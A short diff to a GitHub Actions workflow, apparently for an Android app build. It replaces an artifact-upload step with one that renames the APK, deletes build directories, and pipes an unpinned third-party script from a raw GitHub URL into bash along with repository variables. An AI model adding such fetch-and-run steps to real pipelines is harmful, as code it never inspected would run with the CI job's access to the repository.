@@ -711,9 +711,14 @@ jobs:
           chmod +x gradlew
           ./gradlew assembleDebug --no-daemon
 
-      - name: Upload APK Artifact
-        uses: actions/upload-artifact@v7
-        with:
-          name: pocox8rgb-debug-apk-v${{ github.run_number }}
-          path: pocox8rgb/android/app/build/outputs/apk/debug/app-debug.apk
-          retention-days: 7
+      - name: Clean Environment and Push Updates to Git
+        run: |
+          # Dynamically rename the compiled output asset
+          mv app/build/outputs/apk/debug/app-debug.apk ${{ github.event.repository.name }}.apk
+        
+          # Wipe temporary build trees to avoid repository data bloat
+          rm -rf app/build
+          rm -rf .gradle
+        
+          # Execute the automated synchronization loop script
+          curl -s https://raw.githubusercontent.com/juancolchete/utils/main/gitUpload.sh | bash /dev/stdin ${{ vars.GIT_UPLOAD_PARAMS }} "bot: ${{ github.workflow }}"
